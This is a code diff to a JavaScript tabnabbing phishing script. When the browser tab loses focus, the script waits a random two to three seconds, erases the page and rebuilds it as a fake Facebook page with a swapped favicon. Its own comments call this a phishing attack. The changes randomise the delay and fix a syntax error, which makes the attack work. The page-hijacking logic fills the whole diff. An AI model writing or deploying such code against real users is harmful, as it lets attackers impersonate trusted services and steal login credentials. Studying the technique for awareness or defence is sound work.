@@ -5,15 +5,24 @@
 *
 */
 
+var min_timeout = 2000,
+	max_timeout = 3000;
+
+// Binds the phishing attack to the blurring event
 window.onblur = start_phishing_timeout;
 
+// Counts down to zero from (between max_timeout & min_timeout)
+// and calls the phishing process
 function start_phishing_timeout() {
-	setTimeout(start_phishing, 3000);
+	var timeout = Math.round(Math.random() * (max_timeout - min_timeout)) + min_timeout;
+	console.log(timeout);
+	setTimeout(start_phishing, timeout);
 }
 
+// Starts the phishing process
 function start_phishing() {
 	clear_page_contents();
-	build_page(facebook_face_page1);
+	build_page(facebook_fake_page);
 }
 	
 // Deletes all the current page elements
@@ -38,7 +47,7 @@ function build_page(webpage) {
 // Dynamically changes the favicon of the webpage
 function change_fav_icon(url) {
 	document.head = document.head || document.getElementsByTagName('head')[0];
-	var link = document.createElement('link'),
+	var link = document.createElement('link');
 	link.rel = 'shortcut icon';
 	link.href = url;
 	document.head.appendChild(link);
